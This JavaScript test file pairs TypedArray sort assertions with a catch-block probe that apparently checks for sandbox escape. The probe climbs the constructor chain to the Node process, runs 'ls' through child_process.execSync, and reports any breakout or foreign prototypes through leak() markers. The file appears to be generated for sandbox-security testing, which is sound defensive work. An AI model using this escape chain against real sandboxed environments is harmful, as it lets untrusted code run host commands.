try {
    testWithTypedArrayConstructors(function (TA) {
        throw () => {
            return () => {
            };
        };
        var sample;
        sample = new TA([
            4,
            3,
            2,
            1
        ]).sort();
        assert(compareArray(sample, [
            1,
            2,
            3,
            4
        ]), 'descending values');
        sample = new TA([
            3,
            4,
            1,
            2
        ]).sort();
        assert(compareArray(sample, [
            1,
            2,
            3,
            4
        ]), 'mixed numbers');
        sample = new TA([
            3,
            4,
            3,
            1,
            0,
            1,
            2
        ]).sort();
        assert(compareArray(sample, [
            0,
            1,
            1,
            2,
            3,
            3,
            4
        ]), 'repeating numbers');
    });
    testWithTypedArrayConstructors(function (TA) {
        var sample = new TA([
            1,
            0,
            -0,
            2
        ]).sort();
        assert(compareArray(sample, [
            -0,
            0,
            1,
            2
        ]), '0s');
    }, floatArrayConstructors);
    testWithTypedArrayConstructors(function (TA) {
        var sample = new TA([
            1,
            0,
            -0,
            2
        ]).sort();
        assert(compareArray(sample, [
            0,
            0,
            1,
            2
        ]), '0s');
    }, intArrayConstructors);
    testWithTypedArrayConstructors(function (TA) {
        var sample = new TA([
            -4,
            3,
            4,
            -3,
            2,
            -2,
            1,
            0
        ]).sort();
        assert(compareArray(sample, [
            -4,
            -3,
            -2,
            0,
            1,
            2,
            3,
            4
        ]), 'negative values');
    }, [
        Float64Array,
        Float32Array,
        Int8Array,
        Int16Array,
        Int32Array
    ]);
    testWithTypedArrayConstructors(function (TA) {
        var sample;
        sample = new TA([
            0.5,
            0,
            1.5,
            1
        ]).sort();
        assert(compareArray(sample, [
            0,
            0.5,
            1,
            1.5
        ]), 'non integers');
        sample = new TA([
            0.5,
            0,
            1.5,
            -0.5,
            -1,
            -1.5,
            1
        ]).sort();
        assert(compareArray(sample, [
            -1.5,
            -1,
            -0.5,
            0,
            0.5,
            1,
            1.5
        ]), 'non integers + negatives');
        sample = new TA([
            3,
            4,
            Infinity,
            -Infinity,
            1,
            2
        ]).sort();
        assert(compareArray(sample, [
            -Infinity,
            1,
            2,
            3,
            4,
            Infinity
        ]), 'infinities');
    }, [
        Float64Array,
        Float32Array
    ]);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}